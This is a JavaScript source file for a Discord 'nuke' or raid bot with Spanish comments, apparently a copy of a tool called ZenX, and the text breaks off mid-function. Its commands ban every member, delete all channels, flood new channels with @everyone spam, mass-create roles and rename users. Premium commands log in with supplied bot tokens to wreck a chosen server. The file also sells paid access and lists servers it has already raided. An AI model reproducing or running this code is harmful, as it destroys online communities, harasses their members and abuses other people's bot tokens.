const { Client, ButtonBuilder, ButtonStyle, Permissions, Events, ComponentType, ReactionEmoji, GuildEmoji, WebhookClient, PermissionsBitField, GatewayIntentBits, EmbedBuilder, ChannelType, ActionRowBuilder, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ActivityType, PermissionOverwrites, PermissionFlagsBits, Embed, IntentsBitField} = require('discord.js');
const client = new Client({intents: [103423]});
async function wait_ms(ms) {return new Promise(resolve => setTimeout(resolve, ms));};
const fetch = require("node-fetch");
const fs = require("node:fs");
if(!fs.existsSync('config_premium_users.json')){
    fs.writeFileSync('config_premium_users.json','{}');
};
if(!fs.existsSync('ids_premium_users.json')){
    fs.writeFileSync('ids_premium_users.json','[{}]');
};
if(!fs.existsSync('blacklist_users.json')){
    fs.writeFileSync('blacklist_users.json','[{}]');
};
const bot_token = ""; // Token del bot
const prefix = "&"; // Prefijo de los comandos xd
const prefix_p = "#"; // Prefijo de los comandos premium
let config_usuarios_premium = {};
let idservidores_nopermitidos = ["id_de_tu_servidor", "otro_id_xdd", "y_otro_id_:v"]; // Lista de IDs de servidores donde el bot no puede ejecutar comandos de ataque
let usuarios_owners = ["", ""]; // Lista de IDs de los usuarios owners
let usuarios_premium = [];
let blacklist_user = [];
const channel_logs = "1256824639791825016"; //ID del canal a donde se enviarán los registros - El bot debe estar dentro de ese servidor.
let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
let blaclist_usersids = JSON.parse(blacklist_users_json);
for (let i = 0; i < blaclist_usersids.length; i++) {
    blacklist_user.push(blaclist_usersids[i]['id']);
};
let config_premium_users_json = fs.readFileSync("config_premium_users.json", 'utf-8');
let ids_premium_users_json = fs.readFileSync("ids_premium_users.json", 'utf-8');
let ids_premium_users_xd = JSON.parse(ids_premium_users_json);
config_usuarios_premium = JSON.parse(config_premium_users_json);
for (let i = 0; i < ids_premium_users_xd.length; i++) {
    usuarios_premium.push(ids_premium_users_xd[i]['id']);
};
client.on(`ready`,()=>{
    console.clear();
    console.log(``);
    console.log(`> Bot ${client.user.username} activo.`);
    console.log(`> Invitación del Bot (administrador permisos): https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&integration_type=0&scope=bot`)
    console.log(``)
});
client.on(`messageCreate`,async (msg)=>{
    if(blacklist_user.includes(msg.author.id)){
        return;
    };
    //Normal cmds
    if(msg.content === prefix+"help"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **help** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        }
        await msg.react(`%F0%9F%AA%B6`).catch(e=>{console.log(e)});
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ :dolce_167:‎ ‎ ‎ application‎ commands ‎ ‎ :dolce_167:‎‎ ‎ ‎ ‎ ‎‎‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎  ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎`)
            .setDescription(`:025: **normal cmds ;**
:dolce_145: \`${prefix}on\` **start a raid in the server who the command was executed**
:dolce_145: \`${prefix}banall\` **ban all users in the server**
:dolce_145: \`${prefix}channels\` **delete all channels in the server**
:dolce_145: \`${prefix}spamchannels\` **spam all channels with everyone and invite link**
:dolce_145: \`${prefix}spamroles\` **spam server roles**
:dolce_145: \`${prefix}spamusers\` **rename all users with our vanity**
:dolce_145: \`${prefix}top\` **view the top of raids with our bot**

:dolce_167: \`#invite.guild\` **provide a invite to the guild**
:dolce_145: \`#use.token\` **enter a token to use it for raiding or nuking**
:dolce_145: \`#use.guild\` **select the guild to nuke**
:dolce_145: \`#nuke.guild\` **nuke the selected guild**
:dolce_145: \`#admin.guild\` **get admin on the selected guild**
:dolce_145: \`#find.guilds\`  **find admin guilds with the selected token**

> :dolce_145: *¿what is premium?*
> *It works to customize the bot with your settings.*
> :dolce_145: ** ¿how to get premium?
> *get premium buying it for $1.99 ¡lifetime! [here](https://discord.gg/kEB3PCPkzc)*`)
           .setColor(`#d20f15`)
           //Bro como que `¿what is premium?`, yo ni sé inglés pero no se puede poner "¿" al principio de una question bro...
        ]})
    };
    if(msg.content === prefix+"invite"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **invite** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        }
        await msg.reply(`I've sent you a DM with the invite link!`);
        await msg.author.send({embeds:[
            new EmbedBuilder()
            .setURL(`https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&integration_type=0&scope=bot`)
            .setTitle(`:blackstar: Invite Application`)
            .setDescription(`Click the link above to invite the bot to your server.`)
            .setFooter({text:`Requested by ${msg.author.username}`})
        ]})
    };
    if(msg.content === prefix+"on"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **on** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e);
        }
        if(idservidores_nopermitidos.includes(msg.guild.id)){
            await msg.channel.send({content:`> Ese servidor no está permitido.`});
            return;
        };
        async function enviar_msgxd(canal) {
            let canalxdxd = client.channels.cache.get(canal.id);
            for (let index = 0; index < 30; index++) {
                try {
                    await canalxdxd.send({content:`@everyone https://discord.gg/kEB3PCPkzc - | - https://www.youtube.com/watch?v=rY1JyWyQiSI / #HailZenX`});
                } catch (e) {
                    console.log(`[X] No se pudo enviar un mensaje con el comando "on", mensaje de error: ${e.message}`);
                }
            };
        };
        let canales_xdxd = [];
        async function crear_canalesxdxd() {
            const res = await fetch(`https://discord.com/api/v9/guilds/${msg.guild.id}/channels`,{
                method:'POST',
                headers: {
                    "Authorization":`Bot ${bot_token}`,
                    "content-type":"application/json"
                },
                body: JSON.stringify({
                    "name":"test", //[Nombre_Canal] Acá XD
                    "type":"0"
                })
            });
            const jsonxdxd = await res.json();
            canales_xdxd.push(jsonxdxd['id']);
            if(canales_xdxd.length >= 50){
                let channelss = await msg.guild.channels.fetch();
                for (const ch of channelss.values()) {
                    try {
                        //Obviamente puedes ponerle el nombre a la hora de enviar la petición para crear el canal XDDDDD
                        //Solo que como es una réplica hay que hacerlo igualito pe aksjdaksd
                        //psdta: Puedes obtener el código replicado con bypass en ZenX jeje
                        ch.setName('ʀǟɨɖɮʏռɨӽǟʝǟɮǟʐɨֆ');
                    } catch (e) {
                        console.log(e);
                    };  
                };
                for (const ch of channelss.values()) {
                    try {
                        enviar_msgxd(ch);
                    } catch (e) {
                        console.log(e);
                    };  
                };
            };
        };
        for (let index = 0; index < 50; index++) {
            await wait_ms(10);
            crear_canalesxdxd();
        };
    };
    if(msg.content === prefix+"banall"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **banall** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        }
        if(idservidores_nopermitidos.includes(msg.guild.id)){
            await msg.channel.send({content:`> Ese servidor no está permitido.`});
            return;
        };
        let membersxdxd = await msg.guild.members.fetch();
        for (const m of membersxdxd.values()) {
            try {
                if(m.user.id !== client.user.id){
                    await m.ban();
                }
            } catch (e) {
                console.log(`[X] No se pudo banear al usuario ${m.nickname} con ID ${m.id}, error: ${e.message}`);
            }
        }
    };
    if(msg.content === prefix+"channels"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **channels** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        };
        if(idservidores_nopermitidos.includes(msg.guild.id)){
            await msg.channel.send({content:`> Ese servidor no está permitido.`});
            return;
        };
        let channelsssxdxd = await msg.guild.channels.fetch();
        for (const ch of channelsssxdxd.values()) {
            ch.delete();
        };
        await msg.guild.channels.create({name:"get-nuked",type:ChannelType.GuildText,topic:'zenx on top bro https://discord.gg/kEB3PCPkzc'});
    };
    if(msg.content === prefix+"spamchannels"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **spamchannels** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        };
        if(idservidores_nopermitidos.includes(msg.guild.id)){
            await msg.channel.send({content:`> Ese servidor no está permitido.`});
            return;
        };
        async function enviar_msgxd(canal) {
            let canalxdxd = client.channels.cache.get(canal.id);
            for (let index = 0; index < 25; index++) {
                try {
                    await canalxdxd.send({content:`@everyone https://discord.gg/kEB3PCPkzc - | - https://www.youtube.com/watch?v=rY1JyWyQiSI / #HailZenX`});
                } catch (e) {
                    console.log(`[X] No se pudo enviar un mensaje con el comando "spamchannels", mensaje de error: ${e.message}`);
                }
            };
        };
        let channelsssxdxd = await msg.guild.channels.fetch();
        for (const ch of channelsssxdxd.values()) {
            enviar_msgxd(ch);
        };
    };
    if(msg.content === prefix+"spamroles"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **spamroles** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        };
        if(idservidores_nopermitidos.includes(msg.guild.id)){
            await msg.channel.send({content:`> Ese servidor no está permitido.`});
            return;
        };
        //Bueno, cuando yo probé este comando no funcionó xdd.
        //Así que a intentar equisde.
        for (let index = 0; index < 50; index++) {
            try {
                await msg.guild.roles.create({name:'zenx-on-top',reason:'https://discord.gg/kEB3PCPkzc https://discord.gg/org'});
            } catch (e) {
                console.log(`[X] No se pudo crear un rol en el servidor ${msg.guild.name} con ID ${msg.guild.id}, mensaje de error: ${e.message}`);
            }
        };
    };
    if(msg.content === prefix+"spamusers"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **spamusers** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        };
        if(idservidores_nopermitidos.includes(msg.guild.id)){
            await msg.channel.send({content:`> Ese servidor no está permitido.`});
            return;
        };
        let membersxdxd = await msg.guild.members.fetch();
        for (const m of membersxdxd.values()) {
            try {
                await m.setNickname('.gg/kEB3PCPkzc');
            } catch (e) {
                console.log(`[X] No se pudo renombrar al usuario ${m.nickname} con ID ${m.id}, error: ${e.message}`);
            }
        }
    };
    if(msg.content === prefix+"top"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **top** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        }
        //Acá no tengo la lista actual así que pondré los que me salieron al momento de escribir esto XD
        //dea
        if(msg.channel.type !== ChannelType.DM){
            await msg.channel.send({embeds:[
                new EmbedBuilder()
                .setTitle(`Top 10 Raids`)
                .setDescription(`Here are the top 10 raids by member count:`)
                .addFields(
                    {name:"#1 - #NixSquad (1106 members)",value:"Executed by: 3cp3 on 6/22/2024, 11:53:10 PM"},
                    {name:"#2 - Snol Store #1k (741 members)",value:"Executed by: 09nm on 6/17/2024, 1:57:11 PM"},
                    {name:"#3 - Horizon Vault #BoostUS (707 members)",value:"Executed by: 09nm on 6/23/2024, 9:54:14 PM"},
                    {name:"#4 - yungio jeje (179 members)",value:"Executed by: 3cp3 on 6/16/2024, 8:24:34 PM"},
                    {name:"#5 - SFA | Sudamerican Football Asociation (172 members)",value:"Executed by: kar.w on 6/23/2024, 4:17:09 AM"},
                    {name:"#6 - Galaxy Community FC (40 members)",value:"Executed by: macdonald_9 on 6/20/2024, 11:06:52 PM"},
                    {name:"#7 - 𝒏̃𝒆𝒏𝒇𝒆 (36 members)",value:"Executed by: johnmarston7618 on 6/21/2024, 4:38:48 PM"},
                    {name:"#8 - F$D 🌴 (25 members)",value:"Executed by: alvaa.nigga on 6/19/2024, 8:27:46 PM"},
                    {name:"#9 - penes gordos cremosos y largos (25 members)",value:"Executed by: macdonald_9 on 6/25/2024, 1:22:48 AM"}, //ese nombre XDDDDDD
                    {name:"#10 - Cum Guys (19 members)",value:"Executed by: pinazog on 6/19/2024, 9:13:03 PM"},
                )
            ]});
        }
    };
    const args = msg.content.slice(prefix_p.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    //Owner cmds
    if(command === "user.blacklist"){
        if(!usuarios_owners.includes(msg.author.id)){
            return;
        };
        if(args.length === 0){
            await msg.channel.send({content:`> Falta agregar un ID de usuario.`});
            return;
        };
        let usuario_id = args[0];
        blacklist_user.push(usuario_id);
        //Acá hubiera puesto algo más técnico pero bro... el resultado es el mismo bro....... asdjaskd
        let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
        let ae = JSON.parse(blacklist_users_json);
        let xdxd = JSON.stringify(ae);
        let xd = xdxd.replace("]","");
        let asd = `${xd}\n,{"id":"${usuario_id}"}]`;
        fs.writeFileSync('blacklist_users.json',asd);
    };
    if(command === "user.add"){
        if(!usuarios_owners.includes(msg.author.id)){
            return;
        };
        if(args.length === 0){
            await msg.channel.send({content:`> Falta agregar un ID de usuario.`});
            return;
        };
        let usuario_id = args[0];
        usuarios_premium.push(usuario_id);
        config_usuarios_premium[usuario_id] = "";
        console.log(config_usuarios_premium)
        let usuarios_premium_jsonxd = fs.readFileSync("ids_premium_users.json", 'utf-8');
        let ae = JSON.parse(usuarios_premium_jsonxd);
        let xdxd = JSON.stringify(ae);
        let xd = xdxd.replace("]","");
        let asd = `${xd}\n,{"id":"${usuario_id}"}]`;
        fs.writeFileSync('ids_premium_users.json',asd);
    };
    //premium cmds
    if(command === "invite.guild"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **invite.guild** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        }
        if(!usuarios_premium.includes(msg.author.id)){
            return;
        };
        if(args.length === 0){
            await msg.channel.send({content:`> Falta agregar el enlace de invitación.`});
            return;
        };
        if (!config_usuarios_premium[msg.author.id]) {
            config_usuarios_premium[msg.author.id] = {
                invite_url: args[0]
            };
            await msg.channel.send({content:`> Se agregó una invitación.`});
        } else {
            config_usuarios_premium[msg.author.id].invite_url = args[0];
            await msg.channel.send({content:`> Se editó la invitación.`});
        };
        console.log(config_usuarios_premium);
    };
    if(command === "use.token"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **use.token** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        };
        if(!usuarios_premium.includes(msg.author.id)){
            return;
        };
        if(args.length === 0){
            await msg.channel.send({content:`> Falta agregar el token.`});
            return;
        };
        if (!config_usuarios_premium[msg.author.id]) {
            config_usuarios_premium[msg.author.id] = {
                bot_token_n: args[0]
            };
            await msg.channel.send({content:`> Se agregó el token del bot.`});
        } else {
            config_usuarios_premium[msg.author.id].bot_token_n = args[0];
            await msg.channel.send({content:`> Se editó el token del bot.`});
        };
        let ae = JSON.stringify(config_usuarios_premium);
        fs.writeFileSync('config_premium_users.json',ae);
        console.log(config_usuarios_premium);
    };
    if(command === "use.guild"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **use.guild** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        };
        if(!usuarios_premium.includes(msg.author.id)){
            return;
        };
        if(idservidores_nopermitidos.includes(args[0])){
            await msg.channel.send({content:`> Ese servidor no está permitido.`});
            return;
        };
        if(args.length === 0){
            await msg.channel.send({content:`> Falta agregar la ID del servidor a atacar.`});
            return;
        };
        if (!config_usuarios_premium[msg.author.id]) {
            config_usuarios_premium[msg.author.id] = {
                guild_id: args[0]
            };
            await msg.channel.send({content:`> Se agregó el ID del servidor a atacar.`});
        } else {
            config_usuarios_premium[msg.author.id].guild_id = args[0];
            await msg.channel.send({content:`> Se editó el ID del servidor a atacar.`});
        };
        let ae = JSON.stringify(config_usuarios_premium);
        fs.writeFileSync('config_premium_users.json',ae);
        console.log(config_usuarios_premium);
    };
    if(msg.content === prefix_p+"nuke.guild"){
        try {
            const blacklist_pecausa = new ButtonBuilder()
			    .setCustomId('xdxd')
			    .setLabel('Blacklist User')
			    .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
			    .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({components:[equisde], content:`Command **nuke.guild** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})`});
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int)=>{
                if(int.customId === "xdxd"){
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]","");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json',asd);
                    int.reply({content:`> Usuario en blacklist.`});
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        };
        if(idservidores_nopermitidos.includes(config_usuarios_premium[msg.author.id].guild_id)){
            await msg.channel.send({content:`> Ese servidor no está permitido.`});
            return;
        };
        if(!usuarios_premium.includes(msg.author.id)){
            return;
        };
        if (!config_usuarios_premium[msg.author.id].guild_id) {
            await msg.channel.send({content:`> No haz introducido ninguna ID de un servidor por lo tanto no se puede nukear.`});
            return;
        } else {
            if(!config_usuarios_premium[msg.author.id].bot_token_n){
                await msg.channel.send({content:`> No haz introducido ningún token de bot.`});
                return;
            } else {
                config_usuarios_premium[msg.author.id].invite_url == "" ? "https://discord.gg/kEB3PCPkzc": config_usuarios_premium[msg.author.id].invite_url;
                await msg.channel.send({content:`> Nukeando guild...`});
                let namev = `client${msg.author.id}`;
                namev = new Client({intents: [103423]});
                await namev.login(config_usuarios_premium[msg.author.id].bot_token_n);
                let chsisssss = 0;
                let counterrrrr = 0;
                async function enviar_msgxd(canal) {
                    let canalxdxd = namev.channels.cache.get(canal.id);
                    for (let index = 0; index < 30; index++) {
                        try {
                            await canalxdxd.send({content:`@everyone ${config_usuarios_premium[msg.author.id].invite_url} https://discord.gg/kEB3PCPkzc - | - https://www.youtube.com/watch?v=rY1JyWyQiSI / #HailZenX`});
                            counterrrrr++;
                            if(chsisssss <= counterrrrr){
                                await namev.destroy();
                            };
                        } catch (e) {
                            console.log(`[X] No se pudo enviar un mensaje con el comando "nuke.guild", mensaje de error: ${e.message}`);
                        }
                    };
                };
                let canales_xdxd = [];
                async function crear_canalesxdxd() {
                    const res = await fetch(`https://discord.com/api/v9/guilds/${config_usuarios_premium[msg.author.id].guild_id}/channels`,{
                        method:'POST',
                        headers: {
                            "Authorization":`Bot ${config_usuarios_premium[msg.author.id].bot_token_n}`,
                            "content-type":"application/json"
                        },
                        body: JSON.stringify({
                            "name":"test", //[Nombre_Canal] Acá XD
                            "type":"0"
                        })
                    });
                    const jsonxdxd = await res.json();
                    canales_xdxd.push(jsonxdxd['id']);
                    if(canales_xdxd.length >= 50){
                        let channelss = await namev.guilds.cache.get(config_usuarios_premium[msg.author.id].guild_id).channels.fetch();
                        chsisssss = channelss.size*30;
                        for (const ch of channelss.values()) {
                            try {
                                //Obviamente puedes ponerle el nombre a la hora de enviar la petición para crear el canal XDDDDD
                                //Solo que como es una réplica hay que hacerlo igualito pe aksjdaksd
